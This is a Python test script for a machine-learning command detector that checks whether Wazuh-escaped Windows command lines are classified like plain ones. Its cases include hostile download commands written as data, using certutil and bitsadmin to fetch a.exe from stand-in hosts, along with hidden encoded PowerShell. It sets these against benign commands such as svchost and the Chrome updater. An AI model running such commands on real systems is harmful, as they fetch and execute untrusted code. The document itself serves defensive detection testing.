"""Commands the way Wazuh hands them over (backslashes doubled, quotes escaped) must be read like the plain ones."""
import sys, os, warnings

warnings.filterwarnings("ignore")
from _paths import BACKEND, DATA, DATASETS  # noqa: E402  (tests/_paths.py)
sys.path.insert(0, str(BACKEND))
os.chdir(str(BACKEND))
from app.services.ml import commands as C, runtime

m = runtime.command_model()
cases = [
    ("quoted certutil attack, escaped", r'\"C:\\Windows\\System32\\certutil.exe\" -urlcache -split -f http://1.2.3.4/a.exe a.exe', True),
    ("the same, plain", r'"C:\Windows\System32\certutil.exe" -urlcache -split -f http://1.2.3.4/a.exe a.exe', True),
    ("hidden encoded powershell, escaped", r'\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -enc SQBFAFgA', True),
    ("bitsadmin transfer, escaped", r'C:\\Windows\\System32\\bitsadmin.exe /transfer j http://x.example/a.exe C:\\Users\\Public\\a.exe', True),
    ("Chrome updater as seen live", r'\"C:\\WINDOWS\\SystemTemp\\Google8848_1995308589\\bin\\updater.exe\" --install=appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={X}&lang=en&browser=4&usagestats=0&appname=Google%20Chrome', False),
    ("7-Zip installer, escaped", r'\"C:\\Users\\day_shift_user\\Downloads\\7z2606.exe\"', False),
    ("svchost, escaped", r'C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p', False),
    ("UNC path (must be left alone)", r'net use \\fileserver\share', False),
    ("powershell -File", r'powershell -File C:\scripts\backup.ps1', False),
    ("certutil -hashfile, escaped", r'certutil -hashfile C:\\Windows\\notepad.exe SHA256', False),
]
bad = 0
for name, command, want in cases:
    v = m.check(command)
    ok = v["confirmed"] == want
    bad += not ok
    print(f"{'ok ' if ok else 'BAD'} {name:<36} program={C.program_of(command):<12} p={v['probability']:.2f} confirmed={v['confirmed']!s:5} {v['technique']}")
print("unescape leaves the UNC path alone:", C.unescape(r'net use \\fileserver\share') == r'net use \\fileserver\share')
print("all as expected:", bad == 0)
